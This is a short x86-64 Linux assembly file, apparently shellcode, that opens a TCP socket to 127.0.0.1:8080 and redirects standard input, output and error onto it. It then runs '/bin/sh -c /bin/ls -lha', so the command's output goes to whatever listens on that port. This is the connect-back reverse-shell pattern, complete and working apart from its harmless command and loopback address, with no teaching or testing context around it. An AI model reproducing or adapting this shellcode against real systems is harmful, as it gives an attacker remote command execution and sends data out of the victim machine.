global _start
section .text

_start:
  ; socket(AF_INET, SOCK_STREAM, 0)
  xor edx, edx
  mov esi, 1
  mov edi, 2
  mov eax, 41
  syscall
  mov r15d, eax
  ; connect(sock, &sa, sizeof(sa))
  mov edx, 0x10
  lea rsi, [rel sa]
  mov edi, r15d
  mov eax, 42
  syscall
  ; dup2(sock, 0)
  xor esi, esi
  mov edi, r15d
  mov eax, 33
  syscall
  ; dup2(sock, 1)
  mov esi, 1
  mov edi, r15d
  mov eax, 33
  syscall
  ; dup2(sock, 2)
  mov esi, 2
  mov edi, r15d
  mov eax, 33
  syscall
  ; execve(args[0], args, NULL)
  xor edx, edx
  push rdx
  lea rdi, [rel s_arg2]
  push rdi
  lea rdi, [rel s_arg1]
  push rdi
  lea rdi, [rel s_arg0]
  push rdi
  mov rsi, rsp
  mov eax, 59
  syscall
  int3

s_arg0:
  db "/bin/sh", 0
s_arg1:
  db "-c", 0
s_arg2:
  db "/bin/ls -lha", 0

sa:
  dw 2                          ; sin_family=AF_INET
  dw 0x901f                     ; sin_port=8080
  dd 0x0100007f                 ; sin_addr.s_addr=<127.0.0.1>
  dq 0
